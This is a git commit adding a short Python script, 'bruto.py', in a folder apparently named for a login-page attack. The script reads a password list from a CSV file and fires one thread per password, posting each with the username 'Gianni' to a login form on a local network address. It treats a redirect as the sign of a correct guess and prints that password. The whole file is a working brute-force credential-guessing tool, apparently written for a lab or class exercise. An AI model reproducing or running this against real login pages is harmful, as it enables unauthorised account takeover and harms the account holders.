5eab926df9b5311b9d817f57cc2d3d540a70a259
MicheleGiraudo73 <72200866+MicheleGiraudo73@users.noreply.github.com>
2022-03-23 21:22:17 +0100

    Add files via upload

---
+++ API/AttaccoPageLogin/bruto.py
@@ -0,0 +1,44 @@
+import requests
+import csv
+import threading as thr
+url = 'http://192.168.0.141:5000/'
+passwordlist=None
+with open('C:/Users/albyAa/Downloads/psw.csv') as csv_file:
+    csv_reader = csv.reader(csv_file, delimiter=',')
+    line_count = 0
+    for row in csv_reader:
+        passwordlist = row
+
+lista = []
+sbagliato = True
+
+giusta = None 
+    
+def faiRequest(password, username = "Gianni"):
+    global giusta
+    global url
+    try:
+        myobj = {'username': username,'password':password}
+    
+        x = requests.post(url, data = myobj)
+        print(password)
+        if(x.url!=url):
+            giusta = password
+            #url = "http://127.0.0.1:5000/test/"
+            print(f"trovato {giusta}")
+            #print(x.url)
+            return
+    except:
+        pass
+    return
+
+#print(passwordlist)
+for password in passwordlist:
+    
+    if not giusta:
+        thr.Thread(target=faiRequest, args=(password,)).start()
+        
+    
+    #faiRequest(password)
+        
+
